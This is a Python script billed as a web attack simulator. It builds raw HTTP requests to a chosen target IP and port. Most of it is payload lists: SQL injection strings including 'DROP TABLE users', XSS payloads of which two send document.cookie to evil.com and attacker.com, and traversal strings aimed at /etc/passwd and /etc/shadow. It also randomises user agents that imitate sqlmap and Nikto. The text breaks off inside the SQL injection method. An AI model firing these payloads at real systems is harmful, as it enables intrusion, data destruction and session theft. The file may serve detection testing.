#!/usr/bin/env python3
"""
Web Attack Simulator
Simulates various web-based attacks including SQL injection, XSS, and directory traversal
"""

import socket
import threading
import time
import random
import urllib.parse
from scapy.all import *

class WebAttackSimulator:
    def __init__(self, target_ip, target_port=5000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "' OR 1=1 LIMIT 0,1 --",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<script>window.location='http://attacker.com/steal?data='+document.cookie</script>"
        ]
        
        # Directory traversal payloads
        self.directory_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/etc/passwd%00",
            "../../../etc/shadow",
            "....//....//....//etc/shadow"
        ]
        
        # Common web paths to attack
        self.target_paths = [
            "/login.php",
            "/admin/login.php",
            "/search.php",
            "/index.php",
            "/user.php",
            "/product.php",
            "/news.php",
            "/contact.php",
            "/register.php",
            "/profile.php"
        ]
        
        # User agents to randomize requests
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "curl/7.68.0",
            "sqlmap/1.4.7",
            "Nikto/2.1.6"
        ]
    
    def generate_http_request(self, method, path, payload="", headers=None):
        """Generate HTTP request packet"""
        if headers is None:
            headers = {}
        
        # Default headers
        default_headers = {
            "Host": self.target_ip,
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        
        default_headers.update(headers)
        
        # Build request
        if method.upper() == "GET":
            if payload:
                path += "?" + payload
            request = f"{method.upper()} {path} HTTP/1.1\r\n"
        else:  # POST
            request = f"{method.upper()} {path} HTTP/1.1\r\n"
            default_headers["Content-Type"] = "application/x-www-form-urlencoded"
            default_headers["Content-Length"] = str(len(payload))
        
        # Add headers
        for key, value in default_headers.items():
            request += f"{key}: {value}\r\n"
        
        request += "\r\n"
        
        # Add payload for POST
        if method.upper() == "POST" and payload:
            request += payload
        
        return request.encode()
    
    def sql_injection_attack(self):
        """Simulate SQL injection attacks"""
        print("Starting SQL Injection attacks...")
        
        attack_count = 0
        while self.running and attack_count < 50